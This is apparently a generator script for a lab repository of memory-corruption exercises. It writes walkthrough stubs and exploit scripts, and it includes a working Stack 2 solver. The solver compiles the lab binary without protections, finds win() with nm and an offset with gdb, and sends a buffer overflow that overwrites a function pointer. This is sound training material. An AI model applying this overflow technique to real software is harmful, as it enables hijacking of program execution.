#!/usr/bin/env python3
"""
Generate walkthrough markdown + exploit scripts for liveoverflow-labs exercises.

This is a pragmatic generator so we don't manually maintain dozens of near-identical
writeups/scripts. It writes files into the existing category folders:

- 0.stack/stack.N.{md,py}
- 1.format/formatN.{md,py}
- 2.heap/heapN.{md,py}
- 3.net/netN.{md,py}
- 4.final/finalN.{md,py}

The generated exploit scripts are designed to be runnable on:
- a modern Linux VM (Python3 + gcc + gdb), OR
- inside the `liveoverflow-pwn` container (Python 3.4 compatible scripts).
"""

from __future__ import print_function

import os
from pathlib import Path


ROOT = Path(__file__).resolve().parent


def write_if_changed(path, content):
    path.parent.mkdir(parents=True, exist_ok=True)
    if path.exists():
        old = path.read_text(errors="replace")
        if old == content:
            return False
        # Never overwrite existing markdown docs; generator only creates missing ones.
        if path.suffix == ".md":
            return False
        # (markdown clobber prevention handled above)
    path.write_text(content)
    return True


def stack_md(n, title, goal, offset_hint, run_hint):
    return """## {title}

### Goal

{goal}

### Key idea

- This is a classic memory corruption exercise.
- Use GDB (optionally GEF) to confirm the stack layout and compute the exact offset.

### Offset / layout notes

{offset_hint}

### Quick run

{run_hint}
""".format(
        title=title, goal=goal, offset_hint=offset_hint, run_hint=run_hint
    )


PY34_HELPERS = r'''#!/usr/bin/env python3
# Python 3.4+ compatible helper patterns.
import os, sys, stat, subprocess, tempfile
from pathlib import Path

def which(cmd):
    for d in os.environ.get("PATH", "").split(os.pathsep):
        p = str(Path(d) / cmd)
        if os.path.exists(p) and os.access(p, os.X_OK):
            return p
    return None

def ensure_executable(p):
    st = p.stat()
    if st.st_mode & stat.S_IXUSR:
        return
    p.chmod(st.st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

def run_capture(argv, stdin_bytes=None, env=None):
    p = subprocess.Popen(
        argv,
        stdin=subprocess.PIPE if stdin_bytes is not None else None,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        env=env,
    )
    out, _ = p.communicate(stdin_bytes)
    try:
        out_s = out.decode("utf-8", "replace")
    except Exception:
        out_s = str(out)
    return p.returncode, out_s

def gcc_build(out_path, src_path, extra=None):
    cc = which("gcc")
    if not cc:
        return False, "gcc not found\n"
    cmd = [cc, "-g", "-fno-stack-protector", "-z", "execstack", "-no-pie", "-o", str(out_path), str(src_path)]
    if extra:
        cmd[1:1] = extra
    rc, out = run_capture(cmd)
    return rc == 0 and Path(out_path).exists(), out
'''


def gen_stack():
    d = ROOT / "0.stack"
    items = [
        ("stack.0", "Stack 0", "Overflow `buffer` to make `modified != 0`.", "Typical local overwrite; use 76 bytes on x86_64 builds; confirm with `print &buffer` / `print &modified`.", "python3 stack.0.py"),
        ("stack.1", "Stack 1", "Overflow via `GREENIE` env var to set `modified == 0x0d0a0d0a`.", "On x86_64 builds from this repo: offset is 68 bytes to `modified`; confirm with GDB.", "python3 stack.1.py"),
        ("stack.2", "Stack 2", "Overflow `buffer` to overwrite function pointer `fp` and call `win()`.", "Compute `&fp - &buffer` in GDB, then overwrite `fp` with address of `win` (from `nm`).", "python3 stack.2.py"),
        ("stack.4", "Stack 4", "Control RIP (return address) to redirect execution to `win()`.", "Find offset to saved RIP (cyclic pattern), then ret2win to `win`.", "python3 stack.4.py"),
        ("stack.5", "Stack 5", "Control RIP (return address) to redirect execution.", "Same as stack4; ret2win / shellcode depending on build flags.", "python3 stack.5.py"),
        ("stack.6", "Stack 6", "Bypass a naive ret-address stack-region check and still control flow.", "Program inspects return address; prefer ret2libc / ret2plt that lands outside the forbidden range.", "python3 stack.6.py"),
        ("stack.7", "Stack 7", "Similar to stack6 but returns a heap string; bypass ret check and redirect execution.", "Again: land return address in text/plt/libc (not stack range).", "python3 stack.7.py"),
    ]

    for stem, title, goal, offset_hint, run_hint in items:
        md_path = d / (stem + ".md")
        py_path = d / (stem + ".py")

        changed_md = write_if_changed(md_path, stack_md(stem.split(".")[-1], title, goal, offset_hint, run_hint))

        # For scripts, generate minimal "build + run + verify" scaffolding.
        # Detailed exploit logic is implemented for stack2 and "variable overwrite" levels; RIP levels keep TODO markers.
        if stem in ("stack.0", "stack.1"):
            # These already exist; don't overwrite.
            continue

        if stem == "stack.2":
            py = PY34_HELPERS + r'''
import struct

SUCCESS = "code flow successfully changed"

def main():
    here = Path(__file__).resolve().parent
    src = here / "stack.2.c"
    binp = here / "stack2"
    ok, out = gcc_build(binp, src)
    sys.stdout.write(out)
    if not ok:
        return 2
    ensure_executable(binp)

    # Resolve win() address from nm (non-PIE build => stable).
    rc, nm_out = run_capture(["nm", "-n", str(binp)])
    if rc != 0:
        sys.stderr.write("nm failed\n")
        return 2
    win_addr = None
    for line in nm_out.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[2] == "win":
            win_addr = int(parts[0], 16)
            break
    if win_addr is None:
        sys.stderr.write("could not find win() in nm output\n")
        return 2

    # Use gdb once to compute offset from buffer to fp.
    gdb = which("gdb")
    if not gdb:
        sys.stderr.write("gdb not found; cannot auto-compute offset (install gdb)\n")
        return 2

    script = "\n".join([
        "set pagination off",
        "set confirm off",
        "file " + str(binp),
        "break main",
        "run",
        "printf \"%ld\\n\", (char*)&fp - (char*)&buffer",
        "quit",
        "",
    ])
    with tempfile.NamedTemporaryFile("w", prefix="stack2-", suffix=".gdb", delete=False) as f:
        f.write(script)
        sp = f.name
    try:
        rc, gdb_out = run_capture([gdb, "-q", "-nx", "-batch", "-x", sp], stdin_bytes=b"A\n")
    finally:
        try: os.unlink(sp)
        except OSError: pass
    # Extract last integer line as offset.
    off = None
    for line in gdb_out.splitlines()[::-1]:
        line = line.strip()
        if line.isdigit() or (line.startswith("-") and line[1:].isdigit()):
            off = int(line)
            break
    if off is None or off <= 0 or off > 512:
        sys.stderr.write("failed to parse offset from gdb output\n")
        sys.stderr.write(gdb_out + "\n")
        return 2

    ptr_size = struct.calcsize("P")
    pack = struct.pack("<Q" if ptr_size == 8 else "<I", win_addr)
    payload = b"A" * off + pack + b"\n"
    rc, out = run_capture([str(binp)], stdin_bytes=payload)
    sys.stdout.write(out)
    if SUCCESS in out:
        print("[+] success")
        return 0
    print("[-] failed")
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
'''
        else:
            py = PY34_HELPERS + r'''
def main():
    here = Path(__file__).resolve().parent
    src = here / "{src}"
    outbin = here / "{bin}"
    ok, out = gcc_build(outbin, src)
    sys.stdout.write(out)
    if not ok:
        return 2
    ensure_executable(outbin)
    print("[!] TODO: exploit automation not yet generated for this level.")
    print("    Use GDB to compute offsets/addresses, then update this script.")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
'''.format(src=stem + ".c", bin=stem.replace(".", ""))

        write_if_changed(py_path, py)
        if changed_md:
            pass


def gen_format_heap_stub(category, count):
    # For now: create placeholders so the repo has the expected files;
    # we'll fill in each solver iteratively with verification.
    d = ROOT / category
    for i in range(count):
        md = d / ("{0}.{1}.md".format(category.split(".")[-1], i) if "." in category else "{0}{1}.md".format(category, i))
        py = d / ("{0}.{1}.py".format(category.split(".")[-1], i) if "." in category else "{0}{1}.py".format(category, i))
        if category.endswith("format"):
            base = "format{0}".format(i)
        elif category.endswith("heap"):
            base = "heap{0}".format(i)
        elif category.endswith("net"):
            base = "net{0}".format(i)
        else:
            base = "final{0}".format(i)
        write_if_changed(md, "## {0}\n\nTODO: writeup + diagrams.\n".format(base))
        write_if_changed(py, PY34_HELPERS + "\n# TODO: implement solver for {0}\n".format(base))


def main():
    changed = 0
    gen_stack()
    # Stubs for other categories; we will flesh these out next.
    gen_format_heap_stub("1.format", 5)
    gen_format_heap_stub("2.heap", 4)
    gen_format_heap_stub("3.net", 3)
    gen_format_heap_stub("4.final", 3)
    print("[+] generated/updated solution files")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

